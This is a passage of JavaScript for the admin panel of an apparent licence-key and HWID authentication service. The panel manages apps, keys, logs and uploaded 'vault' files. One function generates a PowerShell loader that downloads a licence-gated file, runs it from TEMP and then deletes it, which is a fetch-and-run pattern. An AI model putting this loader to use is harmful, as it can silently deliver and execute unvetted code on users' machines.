$('var-modal-title').innerText = 'Edit Global Variable';
$('btn-submit-var-modal').innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2"><polyline points="20 6 9 17 4 12"/></svg><span>Save Global Variable</span>`;
$('var-edit-id').value = editItem.id;
$('var-name-input').value = editItem.name || '';
$('var-data-input').value = editItem.data || '';
$('var-authenticated-check').checked = editItem.authenticated !== false;
if ($('var-app-select')) $('var-app-select').value = editItem.appId || 'global';
if ($('var-file-title')) {
$('var-file-title').innerText = editItem.fileName ? `ไฟล์ปัจจุบัน: ${editItem.fileName}` : 'คลิกเพื่อเลือกไฟล์ฝากเข้าระบบ';
}
$('var-file-status').innerText = editItem.fileName
? 'คลิกที่นี่หากต้องการเลือกไฟล์ใหม่เพื่อแทนที่ไฟล์เดิม'
: 'รองรับไฟล์ทุกชนิด เข้ารหัส Base64 พร้อมตรวจ SHA-256 อัตโนมัติ';
} else {
$('var-modal-title').innerText = 'Create Global Variable';
$('btn-submit-var-modal').innerHTML = `<svg viewBox="0 0 24 24" width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg><span>Create Global Variable</span>`;
$('var-edit-id').value = '';
$('var-name-input').value = '';
$('var-data-input').value = '';
$('var-authenticated-check').checked = true;
if ($('var-file-title')) {
$('var-file-title').innerText = 'คลิกเพื่อเลือกไฟล์ฝากเข้าระบบ';
}
$('var-file-status').innerText = 'รองรับไฟล์ทุกชนิด เข้ารหัส Base64 พร้อมตรวจ SHA-256 อัตโนมัติ';
}
$('create-var-modal').classList.remove('hidden');
$('var-name-input').focus();
}
function closeCreateVarModal() {
$('create-var-modal').classList.add('hidden');
pendingUploadFile = null;
}
$('btn-show-create-var').addEventListener('click', () => openCreateVarModal(null));
$('btn-overview-create-var').addEventListener('click', () => openCreateVarModal(null));
$('btn-cancel-var-modal').addEventListener('click', closeCreateVarModal);
$('create-var-modal').addEventListener('click', (e) => {
if (e.target === $('create-var-modal')) closeCreateVarModal();
});
$('var-file-input').addEventListener('change', (e) => {
const file = e.target.files && e.target.files[0];
if (!file) {
pendingUploadFile = null;
return;
}
const reader = new FileReader();
reader.onload = () => {
const resultStr = String(reader.result || '');
const commaIdx = resultStr.indexOf(',');
const base64Data = commaIdx >= 0 ? resultStr.slice(commaIdx + 1) : resultStr;
pendingUploadFile = {
name: file.name,
size: file.size,
base64: base64Data
};
if (!$('var-name-input').value.trim()) {
$('var-name-input').value = file.name.replace(/[^a-zA-Z0-9_.-]/g, '_');
}
if (!$('var-data-input').value.trim()) {
$('var-data-input').value = `AUTH_PROTECTED_FILE:${file.name}`;
}
if ($('var-file-title')) {
$('var-file-title').innerText = `เลือกไฟล์แล้ว: ${file.name}`;
}
$('var-file-status').innerText = `ขนาดไฟล์ ${Math.max(1, Math.ceil(file.size / 1024))} KB • พร้อมเข้ารหัสฝากเข้าตู้นิรภัย API Auth`;
};
reader.readAsDataURL(file);
});
$('create-var-form').addEventListener('submit', async (e) => {
e.preventDefault();
const editId = $('var-edit-id').value;
const name = $('var-name-input').value.trim();
const data = $('var-data-input').value.trim();
const authenticated = $('var-authenticated-check').checked;
const app_id = $('var-app-select') ? $('var-app-select').value : 'global';
if (!name) {
showToast('กรุณาระบุชื่อ Variable Name', 'error');
return;
}
if (!data && !pendingUploadFile && !editId) {
showToast('กรุณาระบุ Variable Data หรือเลือกไฟล์ที่ต้องการฝาก', 'error');
return;
}
const payload = {
name,
data,
authenticated,
app_id
};
if (pendingUploadFile) {
payload.file_name = pendingUploadFile.name;
payload.file_base64 = pendingUploadFile.base64;
}
const res = editId
? await request(`/api/v1/admin/variables/${editId}`, { method: 'PUT', body: JSON.stringify(payload) })
: await request('/api/v1/admin/variables', { method: 'POST', body: JSON.stringify(payload) });
if (res.ok) {
showToast(res.data.message || 'บันทึก Global Variable สำเร็จ', 'success');
closeCreateVarModal();
await loadVariables();
await loadOverview();
document.querySelector('[data-tab="tab-variables"]').click();
} else {
showToast(res.data.message || 'ไม่สามารถบันทึก Global Variable ได้', 'error');
}
});
async function loadVariables() {
const res = await request('/api/v1/admin/variables');
if (res.ok && res.data.variables) {
cachedVariables = res.data.variables;
renderVariables(cachedVariables);
}
}
function renderVariables(vars) {
const tbody = $('variables-tbody');
if (!tbody) return;
tbody.innerHTML = '';
if (vars.length === 0) {
tbody.innerHTML = `<tr><td colspan="6" style="text-align:center;color:var(--text-muted);padding:30px;">ยังไม่มีรายการฝากของหรือ Global Variable กดปุ่ม + Create Global Variable เพื่อฝากไฟล์ .reg .bat .exe หรือข้อมูล</td></tr>`;
return;
}
vars.forEach(v => {
const tr = document.createElement('tr');
const authBadge = v.authenticated !== false
? `<span class="badge-status badge-active">บังคับผ่าน API Auth เท่านั้น</span>`
: `<span class="badge-status badge-expired">Public Auth Init</span>`;
const fileBadge = v.fileName
? `<span class="key-code">${v.fileName}</span> <span style="font-size:12px;color:var(--text-muted);">${Math.max(1, Math.ceil((v.fileSize || 0) / 1024))} KB</span>`
: `<span style="color:var(--accent-ice);font-size:13px;">${(v.data || '').slice(0, 40)}</span>`;
const hashShort = v.fileSha256
? `<code style="color:var(--accent-cyan);font-size:12px;">${v.fileSha256.slice(0, 16)}...</code>`
: `<span style="color:var(--text-dim);font-size:12px;">TEXT-VAR</span>`;
tr.innerHTML = `
<td><span class="key-code">${v.name}</span></td>
<td><b>${v.appName || 'Global All Apps'}</b></td>
<td>${fileBadge}</td>
<td>${authBadge}</td>
<td>${hashShort}</td>
<td class="text-right">
<div class="action-btns">
<button class="btn-icon" onclick="showVaultLoaderCode('${v.id}')">โค้ดดึงผ่าน API Auth</button>
<button class="btn-icon" onclick="editVariableById('${v.id}')">แก้ไข</button>
<button class="btn-icon btn-danger-icon" onclick="deleteVariableById('${v.id}')">ลบ</button>
</div>
</td>
`;
tbody.appendChild(tr);
});
}
window.editVariableById = function(id) {
const item = cachedVariables.find(v => v.id === id);
if (item) openCreateVarModal(item);
};
window.deleteVariableById = async function(id) {
const item = cachedVariables.find(v => v.id === id);
if (!confirm(`ยืนยันการลบรายการฝากของ ${item ? item.name : id} ถาวร?`)) return;
const res = await request(`/api/v1/admin/variables/${id}`, { method: 'DELETE' });
if (res.ok) {
showToast(res.data.message, 'info');
loadVariables();
loadOverview();
}
};
window.showVaultLoaderCode = function(id) {
const item = cachedVariables.find(v => v.id === id);
if (!item) return;
const app = cachedApps.find(a => a.id === item.appId) || cachedApps[0] || {
name: 'YOUR_APP_NAME',
ownerId: 'XERXES889A1C',
secretKey: 'YOUR_APP_SECRET'
};
const card = $('vault-loader-card');
const pre = $('vault-loader-pre');
card.classList.remove('hidden');
const endpoint = `${window.location.origin}/api/v1/external/auth/vault`;
const targetFile = item.fileName || `${item.name}.dat`;
pre.innerText = [
`// ====================================================================`,
`// XERXES ZERO-TRUST API AUTH LOADER ต้องผ่าน API Auth เท่านั้น 100%`,
`// Variable Name : ${item.name}`,
`// Deposited File: ${item.fileName || 'Variable Data Only'}`,
`// SHA-256 Hash  : ${item.fileSha256 || 'Verified on Server'}`,
`// ====================================================================`,
``,
`// PowerShell / Client Auto-Loader ยืนยันคีย์ไลเซนส์ + HWID แล้วดึงไฟล์ไปรันทันที`,
`$AuthPayload = @{`,
`  app_name    = "${app.name}"`,
`  owner_id    = "${app.ownerId}"`,
`  app_secret  = "${app.secretKey}"`,
`  license_key = "ใส่คีย์ไลเซนส์ของลูกค้า"`,
`  hwid        = "HWID-CLIENT-MACHINE"`,
`  var_name    = "${item.name}"`,
`} | ConvertTo-Json`,
``,
`$Res = Invoke-RestMethod -Uri "${endpoint}" -Method POST -ContentType "application/json" -Body $AuthPayload`,
`if ($Res.ok -and $Res.vault.has_file) {`,
`  $Bytes = [Convert]::FromBase64String($Res.vault.file_base64)`,
`  $OutPath = Join-Path $env:TEMP "${targetFile}"`,
`  [IO.File]::WriteAllBytes($OutPath, $Bytes)`,
`  Start-Process -FilePath $OutPath -Wait`,
`  Remove-Item -Path $OutPath -Force`,
`} elseif ($Res.ok) {`,
`  Write-Output $Res.vault.data`,
`}`
].join('\n');
};
$('btn-copy-vault-loader').addEventListener('click', () => {
navigator.clipboard.writeText($('vault-loader-pre').innerText);
showToast('คัดลอกโค้ด API Auth Loader แล้ว', 'success');
});
function openCreateAppModal() {
$('create-app-modal').classList.remove('hidden');
$('new-app-name').focus();
}
function closeCreateAppModal() {
$('create-app-modal').classList.add('hidden');
$('new-app-name').value = '';
$('new-app-desc').value = '';
}
$('btn-show-add-app').addEventListener('click', openCreateAppModal);
$('btn-overview-create-app').addEventListener('click', openCreateAppModal);
$('btn-cancel-app-modal').addEventListener('click', closeCreateAppModal);
$('create-app-modal').addEventListener('click', (e) => {
if (e.target === $('create-app-modal')) {
closeCreateAppModal();
}
});
$('add-app-form').addEventListener('submit', async (e) => {
e.preventDefault();
const name = $('new-app-name').value.trim();
const description = $('new-app-desc').value.trim().slice(0, 50);
if (!name) {
showToast('กรุณาระบุชื่อแอปพลิเคชัน', 'error');
return;
}
const res = await request('/api/v1/admin/apps', {
method: 'POST',
body: JSON.stringify({ name, description, version: '1.0' })
});
if (res.ok) {
showToast(`สร้างแอปพลิเคชัน ${name} สำเร็จ`, 'success');
closeCreateAppModal();
await loadApps();
await loadOverview();
document.querySelector('[data-tab="tab-apps"]').click();
showAppSnippet(res.data.app.id);
} else {
showToast(res.data.message || 'ไม่สามารถสร้างแอปพลิเคชันได้', 'error');
}
});
window.openEditAppModal = function(appId) {
const app = cachedApps.find(a => a.id === appId);
if (!app) return;
$('edit-app-id').value = app.id;
$('edit-app-name').value = app.name || '';
$('edit-app-desc').value = app.description || '';
$('edit-app-version').value = app.version || '1.0';
$('edit-app-status').value = app.status || 'active';
$('edit-app-ownerid').value = app.ownerId || 'XERXES889A1C';
$('edit-app-secret').value = app.secretKey || '';
$('edit-app-modal').classList.remove('hidden');
$('edit-app-name').focus();
};
function closeEditAppModal() {
$('edit-app-modal').classList.add('hidden');
}
$('btn-cancel-edit-app-modal').addEventListener('click', closeEditAppModal);
$('edit-app-modal').addEventListener('click', (e) => {
if (e.target === $('edit-app-modal')) {
closeEditAppModal();
}
});
$('edit-app-form').addEventListener('submit', async (e) => {
e.preventDefault();
const id = $('edit-app-id').value;
const name = $('edit-app-name').value.trim();
const description = $('edit-app-desc').value.trim().slice(0, 50);
const version = $('edit-app-version').value.trim() || '1.0';
const status = $('edit-app-status').value;
const ownerId = $('edit-app-ownerid').value.trim();
const secretKey = $('edit-app-secret').value.trim();
if (!name) {
showToast('กรุณาระบุชื่อแอปพลิเคชัน', 'error');
return;
}
const res = await request(`/api/v1/admin/apps/${id}`, {
method: 'PUT',
body: JSON.stringify({
name,
description,
version,
status,
ownerId,
secretKey
})
});
if (res.ok) {
showToast('บันทึกการแก้ไขแอปพลิเคชันเรียบร้อยแล้ว', 'success');
closeEditAppModal();
await loadApps();
await loadVariables();
await loadLicenses();
await loadOverview();
showAppSnippet(id);
} else {
showToast(res.data.message || 'แก้ไขแอปพลิเคชันไม่สำเร็จ', 'error');
}
});
$('gen-prefix').addEventListener('input', (e) => {
const clean = (e.target.value || 'XERXES').toUpperCase().replace(/[^A-Z0-9]/g, '') || 'XERXES';
$('key-format-preview').innerText = `${clean}-XXXX-XXXX-XXXX`;
});
async function loadOverview() {
const res = await request('/api/v1/admin/overview');
if (res.ok && res.data.stats) {
const s = res.data.stats;
$('stat-total-keys').innerText = s.totalKeys;
$('stat-active-keys').innerText = s.activeKeys;
$('stat-bound-hwid').innerText = s.boundHwid;
$('stat-total-apps').innerText = s.totalApps;
const recentTbody = $('overview-logs-tbody');
if (recentTbody && res.data.recentLogs) {
recentTbody.innerHTML = '';
if (res.data.recentLogs.length === 0) {
recentTbody.innerHTML = `<tr><td colspan="4" style="text-align:center;color:var(--text-muted);padding:24px;">ยังไม่มีกิจกรรมในระบบ</td></tr>`;
} else {
res.data.recentLogs.forEach(l => {
const tr = document.createElement('tr');
const timeStr = new Date(l.timestamp).toLocaleTimeString('th-TH');
const badgeClass = l.level === 'WARN' || l.level === 'SECURITY' ? 'badge-banned' : 'badge-active';
tr.innerHTML = `
<td style="color:var(--text-muted);font-size:12px;">${timeStr}</td>
<td><span class="badge-status ${badgeClass}">${l.level}</span></td>
<td><b>${l.type}</b></td>
<td>${String(l.message).replace(/[()-]/g, '')}</td>
`;
recentTbody.appendChild(tr);
});
}
}
}
}
async function loadLicenses() {
const res = await request('/api/v1/admin/licenses');
if (res.ok && res.data.licenses) {
cachedLicenses = res.data.licenses;
renderLicenses(cachedLicenses);
renderAppScopedResetTable();
}
}
function renderLicenses(licenses) {
const tbody = $('licenses-tbody');
tbody.innerHTML = '';
if (licenses.length === 0) {
tbody.innerHTML = `<tr><td colspan="7" style="text-align:center;color:var(--text-muted);padding:30px;">ยังไม่มีคีย์ในระบบ</td></tr>`;
return;
}
licenses.forEach(lic => {
const tr = document.createElement('tr');
const isExpired = lic.expiresAt && new Date(lic.expiresAt) < new Date();
const statusClass = lic.status === 'banned' ? 'badge-banned' : (isExpired ? 'badge-expired' : 'badge-active');
const statusText = lic.status === 'banned' ? 'ถูกระงับ' : (isExpired ? 'หมดอายุ' : 'พร้อมใช้');
const expireText = lic.expiresAt ? new Date(lic.expiresAt).toLocaleDateString('th-TH') : 'ตลอดชีพ';
const hwidDisplay = lic.hwid ? `<code style="color:var(--accent-cyan);font-size:12px;">${lic.hwid}</code>` : `<span style="color:var(--text-dim);">ยังไม่ผูก</span>`;
tr.innerHTML = `
<td>
<span class="key-code">${lic.key}</span>
<button class="btn-icon" onclick="copyKey('${lic.key}')" title="คัดลอกคีย์">คัดลอก</button>
</td>
<td><b>${lic.appName || 'General'}</b></td>
<td><span class="badge-status ${statusClass}">${statusText}</span></td>
<td>${hwidDisplay}</td>
<td><span style="font-size:12px;">${lic.hwidResetCount || 0} / ${lic.maxHwidResets || 3}</span></td>
<td><span style="font-size:12px;color:var(--text-muted);">${expireText}</span></td>
<td class="text-right">
<div class="action-btns">
<button class="btn-icon" onclick="resetHwidForApp('${lic.appId}', '${lic.key}')" title="RESET HWID เฉพาะแอปนี้">RESET HWID</button>
<button class="btn-icon" onclick="toggleBan('${lic.key}')" title="แบนหรือปลดแบน">${lic.status === 'banned' ? 'ปลดแบน' : 'แบน'}</button>
<button class="btn-icon btn-danger-icon" onclick="deleteLicense('${lic.key}')" title="ลบคีย์">ลบ</button>
</div>
</td>
`;
tbody.appendChild(tr);
});
}
$('license-search').addEventListener('input', (e) => {
const query = e.target.value.toLowerCase();
const filtered = cachedLicenses.filter(l =>
l.key.toLowerCase().includes(query) ||
(l.hwid && l.hwid.toLowerCase().includes(query)) ||
(l.appName && l.appName.toLowerCase().includes(query))
);
renderLicenses(filtered);
});
window.copyKey = function(text) {
navigator.clipboard.writeText(text);
showToast('คัดลอกข้อมูลไปยังคลิปบอร์ดแล้ว', 'success');
};
window.resetHwidForApp = async function(appId, key) {
if (!appId) {
showToast('กรุณาเลือกแอปพลิเคชันก่อน RESET HWID', 'error');
return;
}
const res = await request(`/api/v1/admin/apps/${appId}/reset-hwid`, {
method: 'POST',
body: JSON.stringify({ mode: 'single', key })
});
if (res.ok) {
showToast(res.data.message, 'success');
await loadLicenses();
await loadOverview();
} else {
showToast(res.data.message || 'ไม่สามารถ RESET HWID ได้', 'error');
}
};
window.resetAllHwidForApp = async function(appId) {
const app = cachedApps.find(a => a.id === appId);
if (!app) {
showToast('กรุณาสร้างหรือเลือกแอปพลิเคชันก่อน', 'error');
return;
}
if (!confirm(`ยืนยันการ RESET HWID ทุกคีย์ที่อยู่ในแอปพลิเคชัน ${app.name} เท่านั้น?`)) return;
const res = await request(`/api/v1/admin/apps/${appId}/reset-hwid`, {
method: 'POST',
body: JSON.stringify({ mode: 'all' })
});
if (res.ok) {
showToast(res.data.message, 'success');
await loadLicenses();
await loadOverview();
} else {
showToast(res.data.message || 'ไม่สามารถ RESET HWID ได้', 'error');
}
};
window.openAppResetHwidTab = function(appId) {
document.querySelector('[data-tab="tab-resethwid"]').click();
if ($('reset-app-select')) {
$('reset-app-select').value = appId;
renderAppScopedResetTable();
}
};
function renderAppScopedResetTable() {
const select = $('reset-app-select');
const tbody = $('reset-app-keys-tbody');
const title = $('reset-app-table-title');
if (!select || !tbody) return;
const selectedAppId = select.value;
const app = cachedApps.find(a => a.id === selectedAppId);
if (!app) {
title.innerText = 'รายการคีย์ในแอปพลิเคชันที่เลือก';
tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:30px;">กรุณาสร้างแอปพลิเคชันก่อนใช้งานระบบ RESET HWID</td></tr>`;
return;
}
title.innerText = `รายการคีย์เฉพาะของแอปพลิเคชัน: ${app.name}`;
const appKeys = cachedLicenses.filter(l => l.appId === app.id);
if (appKeys.length === 0) {
tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:30px;">ยังไม่มีคีย์ในแอปพลิเคชัน ${app.name}</td></tr>`;
return;
}
tbody.innerHTML = '';
appKeys.forEach(lic => {
const tr = document.createElement('tr');
const hwidDisplay = lic.hwid
? `<code style="color:var(--accent-cyan);font-size:12px;">${lic.hwid}</code>`
: `<span style="color:var(--text-dim);">ยังไม่ผูกเครื่อง</span>`;
tr.innerHTML = `
<td>
<span class="key-code">${lic.key}</span>
</td>
<td><b>${lic.appName}</b></td>
<td>${hwidDisplay}</td>
<td><span style="font-size:12px;">${lic.hwidResetCount || 0} / ${lic.maxHwidResets || 3}</span></td>
<td class="text-right">
<button class="btn-icon" onclick="resetHwidForApp('${app.id}', '${lic.key}')">RESET HWID</button>
</td>
`;
tbody.appendChild(tr);
});
}
$('reset-app-select').addEventListener('change', renderAppScopedResetTable);
$('app-resethwid-form').addEventListener('submit', async (e) => {
e.preventDefault();
const appId = $('reset-app-select').value;
const key = $('reset-app-key').value.trim();
if (!appId) {
showToast('กรุณาเลือกแอปพลิเคชันก่อน', 'error');
return;
}
if (!key) {
showToast('กรุณากรอกคีย์ไลเซนส์ของแอปพลิเคชันที่เลือก', 'error');
return;
}
await resetHwidForApp(appId, key);
$('reset-app-key').value = '';
});
$('btn-reset-all-app-hwid').addEventListener('click', async () => {
const appId = $('reset-app-select').value;
if (!appId) {
showToast('กรุณาเลือกแอปพลิเคชันก่อน', 'error');
return;
}
await resetAllHwidForApp(appId);
});
window.toggleBan = async function(key) {
const res = await request('/api/v1/admin/licenses/toggle-ban', {
method: 'POST',
body: JSON.stringify({ key })
});
if (res.ok) {
showToast(res.data.message, 'info');
loadLicenses();
loadOverview();
}
};
window.deleteLicense = async function(key) {
if (!confirm(`คุณแน่ใจหรือไม่ว่าต้องการลบคีย์ ${key} ถาวร?`)) return;
const res = await request('/api/v1/admin/licenses/delete', {
method: 'POST',
body: JSON.stringify({ key })
});
if (res.ok) {
showToast('ลบคีย์เรียบร้อย', 'info');
loadLicenses();
loadOverview();
}
};
$('btn-clear-licenses').addEventListener('click', async () => {
if (!confirm('ต้องการลบคีย์ไลเซนส์ทั้งหมดในระบบหรือไม่?')) return;
const res = await request('/api/v1/admin/licenses/clear', { method: 'POST' });
if (res.ok) {
showToast(res.data.message, 'info');
loadLicenses();
loadOverview();
}
});
$('btn-quick-gen').addEventListener('click', async () => {
if (cachedApps.length === 0) {
showToast('กรุณาสร้างแอปพลิเคชันก่อนสร้างคีย์', 'error');
openCreateAppModal();
return;
}
const res = await request('/api/v1/admin/licenses/generate', {
method: 'POST',
body: JSON.stringify({
app_id: cachedApps[0].id,
amount: 1,
duration_days: 30,
prefix: 'XERXES',
max_hwid_resets: 3,
notes: 'Quick VIP 30 Days'
})
});
if (res.ok && res.data.generated.length > 0) {
const k = res.data.generated[0].key;
showToast(`สร้างคีย์สำเร็จ: ${k}`, 'success');
loadOverview();
loadLicenses();
} else {
showToast(res.data.message || 'ไม่สามารถสร้างคีย์ได้', 'error');
}
});
$('gen-form').addEventListener('submit', async (e) => {
e.preventDefault();
if (cachedApps.length === 0) {
showToast('กรุณาสร้างแอปพลิเคชันก่อนสร้างคีย์', 'error');
openCreateAppModal();
return;
}
const appId = $('gen-app-select').value;
const prefix = $('gen-prefix').value.trim();
const days = parseInt($('gen-days').value);
const maxResets = parseInt($('gen-max-resets').value);
const amount = parseInt($('gen-amount').value);
const notes = $('gen-notes').value.trim();
const res = await request('/api/v1/admin/licenses/generate', {
method: 'POST',
body: JSON.stringify({
app_id: appId,
prefix: prefix || 'XERXES',
duration_days: days,
max_hwid_resets: maxResets,
amount: amount || 1,
notes
})
});
if (res.ok) {
showToast(`สร้างคีย์สำเร็จจำนวน ${res.data.count} คีย์!`, 'success');
loadLicenses();
loadOverview();
document.querySelector('[data-tab="tab-licenses"]').click();
} else {
showToast(res.data.message || 'ไม่สามารถสร้างคีย์ได้', 'error');
}
});
async function loadApps() {
const res = await request('/api/v1/admin/apps');
if (res.ok && res.data.apps) {
cachedApps = res.data.apps;
const grid = $('apps-grid');
const select = $('gen-app-select');
const resetSelect = $('reset-app-select');
const varAppSelect = $('var-app-select');
const prevResetVal = resetSelect ? resetSelect.value : '';
grid.innerHTML = '';
select.innerHTML = '';
if (resetSelect) resetSelect.innerHTML = '';
if (varAppSelect) {
varAppSelect.innerHTML = `<option value="global">Global ใช้ได้ทุกแอปพลิเคชันที่ผ่าน API Auth</option>`;
}
if (cachedApps.length === 0) {
grid.innerHTML = `
<div class="card" style="grid-column: 1 / -1; text-align: center; padding: 40px 20px;">
<h4 style="font-size: 17px; margin-bottom: 8px;">ยังไม่มีแอปพลิเคชันในระบบ</h4>
<p style="color: var(--text-muted); font-size: 13.5px; margin-bottom: 18px;">กดปุ่ม Create New Application เพื่อสร้างแอปพลิเคชัน Auth ของคุณ</p>
<button class="btn-primary-glow" style="width: auto;" onclick="document.getElementById('btn-show-add-app').click()">
<span>+ Create New Application</span>
</button>
</div>
`;
$('keyauth-code-card').classList.add('hidden');
const emptyOpt = document.createElement('option');
emptyOpt.value = '';
emptyOpt.innerText = 'ยังไม่มีแอปพลิเคชัน กรุณาสร้างแอปก่อน';
select.appendChild(emptyOpt);
if (resetSelect) resetSelect.appendChild(emptyOpt.cloneNode(true));
renderAppScopedResetTable();
return;
}
cachedApps.forEach(app => {
const card = document.createElement('div');
card.className = 'app-card';
const statusBadge = app.status === 'active'
? `<span class="badge-status badge-active">Active v${app.version || '1.0'}</span>`
: `<span class="badge-status badge-expired">Paused v${app.version || '1.0'}</span>`;
card.innerHTML = `
<div class="app-card-head">
<h4 style="font-size:16px;font-weight:700;">${app.name}</h4>
${statusBadge}
</div>
<div class="app-desc-text">${app.description || 'ไม่มีคำอธิบายแอปพลิเคชัน'}</div>
<div class="app-secret-wrap" title="คลิกเพื่อคัดลอก Owner ID" style="cursor:pointer;" onclick="copyKey('${app.ownerId || 'XERXES889A1C'}')">
<span style="color:var(--text-dim);">Owner ID:</span> ${app.ownerId || 'XERXES889A1C'}
</div>
<div class="app-secret-wrap" title="คลิกเพื่อคัดลอก Secret Key" style="cursor:pointer;" onclick="copyKey('${app.secretKey}')">
<span style="color:var(--text-dim);">Secret:</span> ${app.secretKey}
</div>
<div class="flex-between" style="font-size:12px;color:var(--text-muted);margin-top:4px;flex-wrap:wrap;gap:6px;">
<div class="flex-gap" style="flex-wrap:wrap;">
<button class="btn-icon" onclick="openEditAppModal('${app.id}')">แก้ไข</button>
<button class="btn-icon" onclick="openAppResetHwidTab('${app.id}')">RESET HWID แอปนี้</button>
<button class="btn-icon" onclick="rotateAppSecret('${app.id}')">หมุนคีย์ Secret</button>
<button class="btn-icon" onclick="showAppSnippet('${app.id}')">โค้ด Auth</button>
</div>
<button class="btn-icon btn-danger-icon" onclick="deleteApp('${app.id}')">ลบแอป</button>
</div>
`;
grid.appendChild(card);
const opt = document.createElement('option');
opt.value = app.id;
opt.innerText = `${app.name} v${app.version || '1.0'}`;
select.appendChild(opt);
if (resetSelect) resetSelect.appendChild(opt.cloneNode(true));
if (varAppSelect) varAppSelect.appendChild(opt.cloneNode(true));
});
if (resetSelect && prevResetVal && cachedApps.some(a => a.id === prevResetVal)) {
resetSelect.value = prevResetVal;
}
renderAppScopedResetTable();
}
}
window.rotateAppSecret = async function(id) {
if (!confirm('ยืนยันการหมุนคีย์ Secret Key Rotation สำหรับแอปพลิเคชันนี้?')) return;
const res = await request(`/api/v1/admin/apps/${id}`, {
method: 'PUT',
body: JSON.stringify({ action: 'regenerate_secret' })
});
if (res.ok) {
showToast('หมุนคีย์ Secret Key ใหม่เรียบร้อยแล้ว', 'success');
await loadApps();
showAppSnippet(id);
}
};
window.showAppSnippet = function(appId) {
const app = cachedApps.find(a => a.id === appId);
if (!app) return;
const codeCard = $('keyauth-code-card');
const pre = $('keyauth-snippet-pre');
codeCard.classList.remove('hidden');
const sec = app.secretKey || '';
const partA = sec.slice(0, 16);
const partB = sec.slice(16, 32);
const partC = sec.slice(32, 48);
const partD = sec.slice(48);
pre.innerText = [
`// Xerxes Zero-Trust Auth Configuration Split-Secret & Memory Scrubbing`,
`App Name     : "${app.name}"`,
`Owner ID     : "${app.ownerId || 'XERXES889A1C'}"`,
`Secret Part 1: "${partA}"`,
`Secret Part 2: "${partB}"`,
`Secret Part 3: "${partC}"`,
`Secret Part 4: "${partD}"`,
`App Version  : "${app.version || '1.0'}"`,
`API Endpoint : "${window.location.origin}/api/1.2/"`,
`Zero-Trust   : HMAC-SHA256 Signed + Nonce Replay Guard + Auto Memory Zero`
].join('\n');
};
$('btn-copy-snippet').addEventListener('click', () => {
const text = $('keyauth-snippet-pre').innerText;
navigator.clipboard.writeText(text);
showToast('คัดลอกข้อมูลการเชื่อมต่อ Auth แล้ว', 'success');
});
window.deleteApp = async function(id) {
if (!confirm('ยืนยันลบแอปพลิเคชันนี้และคีย์ที่ผูกอยู่ทั้งหมด?')) return;
const res = await request(`/api/v1/admin/apps/${id}`, { method: 'DELETE' });
if (res.ok) {
showToast('ลบแอปพลิเคชันเรียบร้อย', 'info');
loadApps();
loadVariables();
loadLicenses();
loadOverview();
}
};
async function loadLogs() {
const res = await request('/api/v1/admin/logs');
if (res.ok && res.data.logs) {
const tbody = $('logs-tbody');
tbody.innerHTML = '';
if (res.data.logs.length === 0) {
tbody.innerHTML = `<tr><td colspan="5" style="text-align:center;color:var(--text-muted);padding:30px;">ยังไม่มีประวัติบันทึกในระบบ</td></tr>`;
return;
}
res.data.logs.forEach(l => {
const tr = document.createElement('tr');
const timeStr = new Date(l.timestamp).toLocaleTimeString('th-TH');
const badgeClass = l.level === 'WARN' || l.level === 'SECURITY' ? 'badge-banned' : 'badge-active';
tr.innerHTML = `
<td style="color:var(--text-muted);font-size:12px;">${timeStr}</td>
<td><span class="badge-status ${badgeClass}">${l.level}</span></td>
<td><b>${l.type}</b></td>
<td><code>${l.ip}</code></td>
<td>${String(l.message).replace(/[()-]/g, '')}</td>
`;
tbody.appendChild(tr);
});
}
}
$('btn-clear-logs').addEventListener('click', async () => {
if (!confirm('ต้องการล้างประวัติบันทึกความปลอดภัยทั้งหมดหรือไม่?')) return;
const res = await request('/api/v1/admin/logs/clear', { method: 'POST' });
if (res.ok) {
showToast(res.data.message, 'success');
loadLogs();
loadOverview();
}
});
$('change-pw-form').addEventListener('submit', async (e) => {
e.preventDefault();
const old_password = $('old-password').value;
const new_username = $('new-username') ? $('new-username').value.trim() : '';
const new_password = $('new-password').value;
const res = await request('/api/v1/admin/security/password', {
method: 'POST',
body: JSON.stringify({ old_password, new_username, new_password })
});
if (res.ok) {
showToast(res.data.message, 'success');
$('old-password').value = '';
if ($('new-username')) $('new-username').value = '';
$('new-password').value = '';
} else {
showToast(res.data.message || 'เปลี่ยนข้อมูลบัญชีไม่สำเร็จ', 'error');
}
});
async function loadIntegrityStatus() {
const el = $('golden-hash-display');
if (!el) return;
const res = await request('/api/v1/admin/integrity/status');
if (res.ok && res.data.integrity) {
const h = res.data.integrity.goldenRootHash || 'VERIFIED';
const verified = res.data.integrity.verified !== false;
el.innerText = `${verified ? 'VERIFIED' : 'MODIFIED'} : ${h.slice(0, 20)}`;
}
}
$('btn-rotate-session').addEventListener('click', async () => {
const res = await request('/api/v1/admin/session/rotate', { method: 'POST', body: JSON.stringify({}) });
if (res.ok) {
sessionToken = res.data.token;
sessionSigningKey = res.data.signing_key;
sessionStorage.setItem('xerxes_zt_token', sessionToken);
sessionStorage.setItem('xerxes_zt_sigkey', sessionSigningKey);
showToast(res.data.message, 'success');
loadOverview();
} else {
showToast(res.data.message || 'ไม่สามารถหมุนเวียน Session Token ได้', 'error');
}
});
$('btn-rotate-master').addEventListener('click', async () => {
if (!confirm('ยืนยันการหมุนคีย์หลัก Master Key Rotation และคำนวณลายเซ็น Manifest ใหม่?')) return;
const res = await request('/api/v1/admin/security/rotate-master', { method: 'POST', body: JSON.stringify({}) });
if (res.ok) {
showToast(res.data.message, 'success');
await loadIntegrityStatus();
await loadOverview();
} else {
showToast(res.data.message || 'ไม่สามารถหมุนคีย์หลักได้', 'error');
}
});
$('btn-recalc-manifest').addEventListener('click', async () => {
const res = await request('/api/v1/admin/integrity/recalculate', { method: 'POST', body: JSON.stringify({}) });
if (res.ok) {
showToast(res.data.message, 'success');
await loadIntegrityStatus();
await loadOverview();
}
});
$('btn-rollback-db').addEventListener('click', async () => {
if (!confirm('ยืนยันการกู้คืนฐานข้อมูลจากจุดสำรอง Rollback Snapshot ล่าสุด?')) return;
const res = await request('/api/v1/admin/security/rollback', { method: 'POST', body: JSON.stringify({}) });
if (res.ok) {
showToast(res.data.message, 'success');
await loadApps();
await loadVariables();
await loadLicenses();
await loadOverview();
} else {
